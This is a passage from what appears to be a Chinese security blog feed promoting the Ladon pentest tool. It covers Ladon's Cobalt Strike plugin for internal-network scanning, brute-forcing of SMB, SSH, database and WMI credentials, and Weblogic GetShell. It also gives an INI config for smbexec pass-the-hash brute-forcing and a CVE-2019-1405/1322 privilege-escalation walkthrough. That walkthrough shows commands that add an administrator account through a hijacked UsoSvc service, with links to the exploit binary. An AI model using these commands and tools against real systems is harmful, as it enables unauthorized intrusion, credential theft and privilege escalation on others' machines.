<h3 id="暂不支持功能"><a href="#暂不支持功能" class="headerlink" title="暂不支持功能"></a>暂不支持功能</h3><p>=============================================<br>Struts2Poc  X不支持<br>TomcatScan X不支持<br>HttpBasicScan X不支持，只能检测是否401认证URL，无法爆破<br>WeblogicPoc X 竟然不支持(Win下mono也不支持，显然mono问题)<br>MssqlScan X不支持只能扫到开放端口<br>IpcScan X不支持(因为调用cmd命令)</p>
<h3 id="MacOS功能实测"><a href="#MacOS功能实测" class="headerlink" title="MacOS功能实测"></a>MacOS功能实测</h3><p>由于环境少原因，仅测了以下功能，其它模块请自行测试。<br>可用功能应该和在Kali下可使用差不多，如不可用可反馈。</p>
<h4 id="MS17010漏洞扫描"><a href="#MS17010漏洞扫描" class="headerlink" title="MS17010漏洞扫描"></a>MS17010漏洞扫描</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_ms17010.jpg"></p>
<h4 id="OsScan系统探测"><a href="#OsScan系统探测" class="headerlink" title="OsScan系统探测"></a>OsScan系统探测</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_osscan.jpg"></p>
<h4 id="UrlScan、Base64加解密"><a href="#UrlScan、Base64加解密" class="headerlink" title="UrlScan、Base64加解密"></a>UrlScan、Base64加解密</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_UrlScan.jpg"></p>
<h4 id="webScan-SameWeb网站信息扫描"><a href="#webScan-SameWeb网站信息扫描" class="headerlink" title="webScan/SameWeb网站信息扫描"></a>webScan/SameWeb网站信息扫描</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/mac/mac_sameWeb.jpg"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Kali</tag>
        <tag>Scanner</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon For Cobalt Strike 4.0</title>
    <url>/p/c5430395.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 6.2支持Cobalt Strike 4.0,内置58个功能<br>加载脚本Ladon.cna,通过Beacon命令或右键使用</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>CS命令行下扫描目标内网,无需代理转发扫描收集信息、密码爆破等<br>跳板扫描外网资产(即无需代理直接通过在控机器扫描其它目标资产)</p>
<h3 id="Ladon右键菜单"><a href="#Ladon右键菜单" class="headerlink" title="Ladon右键菜单"></a>Ladon右键菜单</h3><p>相比Beacon命令行，GUI就更简单了，只需填写IP、URL等，一键扫描</p>
<p>主菜单<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_Ladon.PNG"><br>资产扫描<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonDiscover.PNG"><br>漏洞检测<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonVulScan.PNG"><br>密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonBrute.PNG"><br>网络嗅探<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonSinfiier.PNG"><br>信息收集<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS4_LadonGetinfo.PNG"></p>
<p>例子：WmiHash密码爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p>
<h3 id="Beacon命令帮助"><a href="#Beacon命令帮助" class="headerlink" title="Beacon命令帮助"></a>Beacon命令帮助</h3><p>Example: Ladon help</p>
<p><img alt data-original="http://k8gege.org/k8img/Ladon/CS_Ladon.gif"></p>
<h3 id="1-MS17010-MS17-010漏洞扫描"><a href="#1-MS17010-MS17-010漏洞扫描" class="headerlink" title="1.MS17010 MS17-010漏洞扫描"></a>1.MS17010 MS17-010漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 MS17010<br>结果:IP、SMB漏洞、机器名、操作系统版本<br><img alt="MS17010" data-original="http://k8gege.org/k8img/Ladon/cs/CS_MS17010.gif"></p>
<h3 id="2-OSscan-操作系统探测"><a href="#2-OSscan-操作系统探测" class="headerlink" title="2.OSscan 操作系统探测"></a>2.OSscan 操作系统探测</h3><p>Example: Ladon 192.168.1.8/24 OSscan<br>通过SMB、多端口、Banner等方式探测（存活主机、主机名、域名、操作系统版本、开放服务等）<br><img alt="OSscan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OSscan.gif"></p>
<h3 id="3-OnlinePC-存活主机扫描"><a href="#3-OnlinePC-存活主机扫描" class="headerlink" title="3.OnlinePC 存活主机扫描"></a>3.OnlinePC 存活主机扫描</h3><p>Example: Ladon 192.168.1.8/24 OnlinePC<br>也支持检测主机名/域名是否存活,结果IP、Mac、机器名<br><img alt="OnlinePC" data-original="http://k8gege.org/k8img/Ladon/cs/CS_OnlinePC.gif"></p>
<h3 id="4-WebScan-Web扫描"><a href="#4-WebScan-Web扫描" class="headerlink" title="4.WebScan Web扫描"></a>4.WebScan Web扫描</h3><p>Example: Ladon 192.168.1.8/24 WebScan<br>内网站点扫描，获取服务器Banner、网页标题<br><img alt="WebScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebScan.gif"></p>
<h3 id="5-FtpScan-FTP密码扫描"><a href="#5-FtpScan-FTP密码扫描" class="headerlink" title="5.FtpScan FTP密码扫描"></a>5.FtpScan FTP密码扫描</h3><p>Example: Ladon 192.168.1.8/24 FtpScan<br>需上传user.txt和pass.txt至beacon工作目录<br><img alt="FtpScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_FtpScan.gif"></p>
<h3 id="6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"><a href="#6-WmiScan-Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）" class="headerlink" title="6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）"></a>6.WmiScan Win方式爆破Windows密码（IPC被拒绝时可尝试WMI）</h3><p>Example: Ladon 192.168.1.8/24 WmiScan<br>Wmi方式批量爆破内网主机帐密,需上传user.txt和pass.txt至工作目录<br><img alt="WmiScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WmiScan.gif"></p>
<h3 id="7-CiscoScan-思科设备扫描"><a href="#7-CiscoScan-思科设备扫描" class="headerlink" title="7.CiscoScan 思科设备扫描"></a>7.CiscoScan 思科设备扫描</h3><p>Example: Ladon 192.168.1.8/24 CiscoScan<br>(IP、设备型号、主机名、Boot、硬件版本)<br><img alt="CiscoScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_CiscoScan.gif"></p>
<h3 id="8-UrlScan-C段域名URL扫描"><a href="#8-UrlScan-C段域名URL扫描" class="headerlink" title="8.UrlScan C段域名URL扫描"></a>8.UrlScan C段域名URL扫描</h3><p>Example: Ladon 192.168.1.8/24 UrlScan<br>通过源码获取域名或URL，但不验证IP,适用于内网扫描时，目标域名指向外网IP<br>或者通过域名判断内网站点是何产品，比如出现cisco.com域名，说明此为cisco设备<br><img alt="UrlScan" data-original="http://k8gege.org/k8img/Ladon/cs/CS_UrlScan.gif"></p>
<h3 id="9-SameWeb-C段旁站扫描"><a href="#9-SameWeb-C段旁站扫描" class="headerlink" title="9.SameWeb C段旁站扫描"></a>9.SameWeb C段旁站扫描</h3><p>Example: Ladon 192.168.1.8/24 SameWeb<br>通过源码获取域名并验证IP，返回正确的同服站点,非bing或爱站等方式,即内网不可上网也可扫描<br>验证IP主要适用于，外网扫描时旁站，因为获取的域名指向外网时，无法通过IP判断是否属于同服<br><img alt="SameWeb" data-original="http://k8gege.org/k8img/Ladon/cs/CS_SameWeb.gif"></p>
<h3 id="10-WeblogicExp-amp-WeblogicPoc"><a href="#10-WeblogicExp-amp-WeblogicPoc" class="headerlink" title="10.WeblogicExp &amp; WeblogicPoc"></a>10.WeblogicExp &amp; WeblogicPoc</h3><p>Example: Ladon 192.168.1.8/24 WeblogicPoc<br>Example: Ladon 192.168.1.8/24 WeblogicExp<br>Weblogic漏洞扫描两个模块,一个是只扫描是否存在漏洞，另一个是扫描并且GetShell<br><img alt="WeblogicExp" data-original="http://k8gege.org/k8img/Ladon/cs/CS_WeblogicExp.gif"></p>
<h3 id="11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机"><a href="#11-EnumMSSQL-枚举局域网MS-SQL-SERVER数据库主机" class="headerlink" title="11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机"></a>11.EnumMSSQL 枚举局域网MS SQL SERVER数据库主机</h3><p>Example: Ladon 192.168.1.8/24 EnumMSSQL<br>和PowerUpSql一样不一定能获取到SQL版本<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumMSSQL.gif"></p>
<h3 id="12-EnumShare-枚举局域网共享资源"><a href="#12-EnumShare-枚举局域网共享资源" class="headerlink" title="12.EnumShare 枚举局域网共享资源"></a>12.EnumShare 枚举局域网共享资源</h3><p>Example: Ladon 192.168.1.8/24 EnumShare<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_EnumShare.gif"></p>
<h3 id="13-MssqlScan-MSSQL数据库密码爆破"><a href="#13-MssqlScan-MSSQL数据库密码爆破" class="headerlink" title="13.MssqlScan MSSQL数据库密码爆破"></a>13.MssqlScan MSSQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MssqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MssqlScan.gif"></p>
<h3 id="14-MysqlScan-MySQL数据库密码爆破"><a href="#14-MysqlScan-MySQL数据库密码爆破" class="headerlink" title="14.MysqlScan MySQL数据库密码爆破"></a>14.MysqlScan MySQL数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 MysqlScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_MysqlScan.gif"></p>
<h3 id="15-SSHscan-SSH主机密码爆破"><a href="#15-SSHscan-SSH主机密码爆破" class="headerlink" title="15.SSHscan SSH主机密码爆破"></a>15.SSHscan SSH主机密码爆破</h3><p>Example: Ladon 192.168.1.8/24 SSHscan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SSHscan.gif"></p>
<h3 id="16-OracleScan-Oracle数据库密码爆破"><a href="#16-OracleScan-Oracle数据库密码爆破" class="headerlink" title="16.OracleScan Oracle数据库密码爆破"></a>16.OracleScan Oracle数据库密码爆破</h3><p>Example: Ladon 192.168.1.8/24 OracleScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_OracleScan.gif"></p>
<h3 id="17-HostIP-域名解析-主机名转IP"><a href="#17-HostIP-域名解析-主机名转IP" class="headerlink" title="17.HostIP 域名解析/主机名转IP"></a>17.HostIP 域名解析/主机名转IP</h3><p>Example: Ladon 192.168.1.8/24 HostIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_HostIP.gif"></p>
<h3 id="18-WhatCMS-Web指纹识别支持75种"><a href="#18-WhatCMS-Web指纹识别支持75种" class="headerlink" title="18.WhatCMS Web指纹识别支持75种"></a>18.WhatCMS Web指纹识别支持75种</h3><p>Example: Ladon 192.168.1.8/24 WhatCMS<br>url.txt指定站点或批量站点扫描,也可扫描整个C段部分web端口对应CMS<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WhatCMS.gif"></p>
<h3 id="19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc"><a href="#19-IpcScan-Windows密码爆破-Wmi被拒绝时可尝试Ipc" class="headerlink" title="19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)"></a>19.IpcScan Windows密码爆破(Wmi被拒绝时可尝试Ipc)</h3><p>Example: Ladon 192.168.1.8/24 IpcScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_IpcScan.gif"></p>
<h3 id="21-EnBase64-DeBase64-Base64密码批量加密解密"><a href="#21-EnBase64-DeBase64-Base64密码批量加密解密" class="headerlink" title="21.EnBase64/DeBase64  Base64密码批量加密解密"></a>21.EnBase64/DeBase64  Base64密码批量加密解密</h3><p>Example: Ladon 明文字符串 EnBase64<br>Example: Ladon Base64内容 DeBase64<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_Base64.gif"></p>
<h3 id="22-EnHex-DeHex-Hex密码批量加密解密-3种格式"><a href="#22-EnHex-DeHex-Hex密码批量加密解密-3种格式" class="headerlink" title="22.EnHex/DeHex  Hex密码批量加密解密(3种格式)"></a>22.EnHex/DeHex  Hex密码批量加密解密(3种格式)</h3><p>Example: Ladon 明文字符串 EnHex<br>Example: Ladon 16进制内容 EnHex<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DeHex.gif"></p>
<h3 id="23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志"><a href="#23-SmbScan-Windows密码爆破-Wmi被拒绝时可尝试-记录错误日志" class="headerlink" title="23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)"></a>23.SmbScan Windows密码爆破(Wmi被拒绝时可尝试,记录错误日志)</h3><p>Example: Ladon 192.168.1.8/24 SmbScan<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SmbScan.gif"></p>
<h3 id="24-PhpStudyPoc-PhpStudy后门检测"><a href="#24-PhpStudyPoc-PhpStudy后门检测" class="headerlink" title="24.PhpStudyPoc PhpStudy后门检测"></a>24.PhpStudyPoc PhpStudy后门检测</h3><p>Example: Ladon 192.168.1.8/24 PhpStudyPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_PhpStudyPoc.gif"></p>
<h3 id="25-DomainIP-域名解析"><a href="#25-DomainIP-域名解析" class="headerlink" title="25.DomainIP 域名解析"></a>25.DomainIP 域名解析</h3><p>Example: Ladon youdomain DomainIP<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_DomainIP.gif"></p>
<h3 id="26-SubDomain-子域名爆破"><a href="#26-SubDomain-子域名爆破" class="headerlink" title="26.SubDomain 子域名爆破"></a>26.SubDomain 子域名爆破</h3><p>Example: Ladon 192.168.1.8/24 SubDomain<br>需域名字典SubDomain.dic<br>例子: Ladon baidu.com SubDomain<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_SubDomain.gif"></p>
<h3 id="27-WebDir-Web目录扫描"><a href="#27-WebDir-Web目录扫描" class="headerlink" title="27.WebDir Web目录扫描"></a>27.WebDir Web目录扫描</h3><p>Example: Ladon <a href="http://youweb.com" target="_blank" rel="noopener">http://youweb.com</a> WebDir<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_WebDir.gif"></p>
<h3 id="28-ActiveMQPoc-ActiveMQ漏洞扫描"><a href="#28-ActiveMQPoc-ActiveMQ漏洞扫描" class="headerlink" title="28.ActiveMQPoc ActiveMQ漏洞扫描"></a>28.ActiveMQPoc ActiveMQ漏洞扫描</h3><p>Example: Ladon 192.168.1.8/24 ActiveMQPoc<br><img alt data-original="http://k8gege.org/k8img/Ladon/cs/CS_ActiveMQPoc.gif"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon 6.2自定义密码爆破</title>
    <url>/p/53177.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>内置密码爆破模块还不够全面，研发其它协议认证需要时间。<br>先不说功能实现，首先搭建各种协议认证环境就不少时间吧。<br>还有别人的工具不开源的情况，而且它只能支持单个IP爆破。<br>这时候我们需要批量爆破整个C段、多个网段、或批量列表。<br>批量包括但不限于IP、URL、机器名、CIDR格式、任意XX等。</p>
<h3 id="INI配置插件"><a href="#INI配置插件" class="headerlink" title="INI配置插件"></a>INI配置插件</h3><p>适用场景，需调用相关命令或第三方工具进行批量操作<br>或者有新的POC，但来不及或无法写成DLL来调用时<br>很多第3方工具不支持批量或者说根本不支持批量网段<br>而Ladon不只限于批量IP、URL、IP段、任意内容等<br>是紧急情况下最适合用于验证内网是否存在漏洞工具<br>新的漏洞来时你能调好POC就不错了，批量更要时间</p>
<h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>例子：调用修改过的smbexec.exe进行HASH密码验证，原版不退出无法爆破<br>根目录下放4个文件，smbexec.exe、smbhash.ini、user.txt、pass.txt。</p>
<p>smbhash.ini</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=smbexec.exe</span><br><span class="line">arg=-hashes <span class="variable">$pass</span>$ <span class="variable">$user</span><span class="variable">$@</span><span class="variable">$ip</span>$</span><br><span class="line">isok=Launching semi-interactive shell</span><br><span class="line">port=445</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="INI插件用法"><a href="#INI插件用法" class="headerlink" title="INI插件用法"></a>INI插件用法</h3><p>命令：Ladon 192.168.1.1/24 smbhash.ini</p>
<h3 id="INI参数说明"><a href="#INI参数说明" class="headerlink" title="INI参数说明"></a>INI参数说明</h3><p>exe:  程序名称，必填项。不指定路径优先加载SYSTEM32目录或当前目录下程序<br>arg:  程序参数，必填项。其中$ip$、$user$、$pass$变量为字典文件替换变量<br>isok：成功标志，必填项。如smbexec成功时返回”Launching semi-interactive shell”<br>port：对应端口，非必填。如SMB为445，Ladon先检测到端口开放，才进行密码爆破<br>log:  程序日志，非必填。如有些程序返回一堆错误结果，我们不想看，可不显示</p>
<p>检测内网C段是否使用同一个密码,命令：Ladon 192.168.1.1/24 smbhash.ini<br>截图为6.1，大家记得把ret改成isok就行了。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p>
<h3 id="功能多余？"><a href="#功能多余？" class="headerlink" title="功能多余？"></a>功能多余？</h3><p>有人可能会说，功能用不到，批量用自己的程序就可以了。<br>1.不是所有人都会编程，INI配置的目的主要是给这些人用的。<br>2.据我所知市面上的批量，仅支持批量单一列表，如IP列表、URL列表等，且不支持模块化。</p>
<p>举个例子：CVE-2019-0708原版漏洞检测批量支持C段扫描，但不支持批量C段甚至批量B段扫描。<br>没错它是开源的，但有几个人去实现修改让它支持更多实战环境的批量需求？<br>C语言的多线程操作可和Python这种小学生都能轻松学会的人随便写的啊。<br>如果别的Poc，用其它你不懂的语言来写，你需要急用，你还会慢慢去学？<br>当然你不觉得麻烦，也可以另外用自己会的语言写个批量调用工具，哈哈</p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>密码爆破</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Brute</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SqlDataSourceEnumerator获取局域网SQL主机</title>
    <url>/p/61471.html</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的。</p>
<h3 id="SqlDataSourceEnumerator"><a href="#SqlDataSourceEnumerator" class="headerlink" title="SqlDataSourceEnumerator"></a>SqlDataSourceEnumerator</h3><p>命名空间: System.Data.Sql<br>程序集: System.Data.dll</p>
<p>提供了一种枚举本地网络内的所有可用 SQL Server 实例的机制。</p>
<p>通过方法调用返回的表包含以下列，所有列均包含 string 值：<br>列     描述<br>ServerName     服务器的名称。<br>InstanceName     服务器实例的名称。 如果服务器作为默认实例运行，则为空白。<br>IsClustered     指示服务器是否属于群集。<br>Version     服务器的版本。 例如:</p>
<p>-9.00 （SQL Server 2005）<br>-10.0. xx （SQL Server 2008）<br>-10.50 （SQL Server 2008 R2）<br>-11.0. xx （SQL Server 2012）</p>
<h3 id="C-示例代码"><a href="#C-示例代码" class="headerlink" title="C#示例代码"></a>C#示例代码</h3><p>.NET与PowerShell谁的兼容性和执行效率更好就不用我说了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System.Data.Sql;  </span><br><span class="line">  </span><br><span class="line">class Program  </span><br><span class="line">&#123;  </span><br><span class="line">  static void Main()  </span><br><span class="line">  &#123;  </span><br><span class="line">    &#x2F;&#x2F; Retrieve the enumerator instance and then the data.  </span><br><span class="line">    SqlDataSourceEnumerator instance &#x3D;  </span><br><span class="line">      SqlDataSourceEnumerator.Instance;  </span><br><span class="line">    System.Data.DataTable table &#x3D; instance.GetDataSources();  </span><br><span class="line">  </span><br><span class="line">    &#x2F;&#x2F; Display the contents of the table.  </span><br><span class="line">    DisplayData(table);  </span><br><span class="line">  </span><br><span class="line">    Console.WriteLine(&quot;Press any key to continue.&quot;);  </span><br><span class="line">    Console.ReadKey();  </span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">  private static void DisplayData(System.Data.DataTable table)  </span><br><span class="line">  &#123;  </span><br><span class="line">    foreach (System.Data.DataRow row in table.Rows)  </span><br><span class="line">    &#123;  </span><br><span class="line">      foreach (System.Data.DataColumn col in table.Columns)  </span><br><span class="line">      &#123;  </span><br><span class="line">        Console.WriteLine(&quot;&#123;0&#125; &#x3D; &#123;1&#125;&quot;, col.ColumnName, row[col]);  </span><br><span class="line">      &#125;  </span><br><span class="line">      Console.WriteLine(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell命令"><a href="#PowerShell命令" class="headerlink" title="PowerShell命令"></a>PowerShell命令</h3><p>系统未安装或禁用PowerShell会失效，但也比国人故意吹捧的PowerUPSQL好很多倍。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br><span class="line"></span><br><span class="line">ServerName          InstanceName        IsClustered         Version</span><br><span class="line">----------          ------------        -----------         -------</span><br><span class="line">K82003-77562E10</span><br><span class="line">WIN-OLDM1T2H9M4</span><br></pre></td></tr></table></figure>

<h3 id="PowerUPSQL"><a href="#PowerUPSQL" class="headerlink" title="PowerUPSQL"></a>PowerUPSQL</h3><p>此工具也是基于SqlDataSourceEnumerator实现的，兼容性较差，很多系统下运行各种报错。</p>
<pre><code class="Bash">PS C:\Users\k8gege\Desktop\PowerUpSQL-master&gt; Get-SQLInstanceBroadcast -Verbose
详细信息: Attempting to identify SQL Server instances on the broadcast domain.
详细信息: 2 SQL Server instances were found.

ComputerName                        Instance                           IsClustered                        Version                           
------------                        --------                           -----------                        -------                           
K82003-77562E10                     K82003-77562E10                                                                                         
WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
<h3 id="Ladon-EnumMssql"><a href="#Ladon-EnumMssql" class="headerlink" title="Ladon EnumMssql"></a>Ladon EnumMssql</h3><p>Ladon的EnumMssql模块不支持扫描，若内网存在多个网段，可使用PortScan扫描探测。<br><img alt="img" data-original="https://camo.githubusercontent.com/2e97e127bfc1acd625ee289dbfaf4b3ffd307bd7/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f63732f43535f456e756d4d5353514c2e676966"></p>
<p>Ladon与PowerUPSQL对比，Ladon支持任意Win系统，而PowerUPSQL就未必能用了<br><img alt="img" data-original="https://camo.githubusercontent.com/73b58a071a70adf62dc7f4aecd1dff48d8e5df40/68747470733a2f2f6b38676567652e6769746875622e696f2f6b38696d672f4c61646f6e2f6578652f456e756d4d5353514c2e676966"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/data/adonet/sql/enumerating-instances-of-sql-server</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>主机发现</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>.NET</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
    <url>/p/19321.html</url>
    <content><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p>
<p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p>
<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p>
<h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p>
<p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
]]></content>
      <categories>
        <category>Exp</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
        <tag>LPE</tag>
      </tags>
  </entry>
  <entry>
